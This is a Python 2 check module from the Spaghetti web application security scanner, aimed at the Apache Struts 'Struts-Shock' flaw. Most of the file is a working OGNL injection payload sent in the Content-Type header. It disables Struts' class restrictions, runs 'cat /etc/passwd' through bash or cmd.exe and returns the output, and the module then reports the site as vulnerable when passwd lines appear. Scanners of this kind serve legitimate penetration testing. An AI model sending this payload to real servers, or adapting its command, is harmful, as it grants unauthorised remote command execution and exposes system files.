#!/usr/bin/env python 
# -*- coding:utf-8 -*-
#
# Spaghetti: Web Application Security Scanner
#
# @url: https://github.com/m4ll0k/Spaghetti
# @author: Momo Outaadi (M4ll0k)
# @license: See the file 'LICENSE.txt'

import re
import sys

from net import utils
from net import parameters
from net import request
from utils import output

class Strutsshock:
	def __init__(self,agent,proxy,redirect,timeout,url,cookie):
		self.url = url 
		self.cookie = cookie
		self.check = utils.Checker()
		self.output = output.Output()
		self.param = parameters
		self.request = request.Request(
			agent = agent,
			proxy = proxy,
			redirect = redirect,
			timeout = timeout
			)

	def run(self):
		info = {
		'name'        : 'Strutsshock',
		'fullname'    : 'Strutsshock',
		'author'      : 'Momo Outaadi (M4ll0k)',
		'description' : 'Checking Struts Vulnerability'
		}

		if '--verbose' in sys.argv:
			self.output.info('Checking Struts-Shock...')	
		
		try:
			payload = "%{(#_='multipart/form-data')."
			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
			payload += "(#_memberAccess?"
			payload += "(#_memberAccess=#dm):"
			payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
			payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
			payload += "(#ognlUtil.getExcludedPackageNames().clear())."
			payload += "(#ognlUtil.getExcludedClasses().clear())."
			payload += "(#context.setMemberAccess(#dm))))."
			payload += "(#cmd='cat /etc/passwd')." # cmd command = cat /etc/passwd
			payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
			payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
			payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
			payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
			payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
			payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
			payload += "(#ros.flush())}"
			resp = self.request.send(self.url,headers={'Content-Type':payload},cookies=self.cookie)
			if resp.status_code == 200:
				if re.search(r'(root:/root:/bin/bash)',resp.content,re.I):
					self.output.plus('The site is mybe vulnerable to Struts-Shock. See also https://www.exploit-db.com/exploits/41570/.')
		except Exception,e:
			pass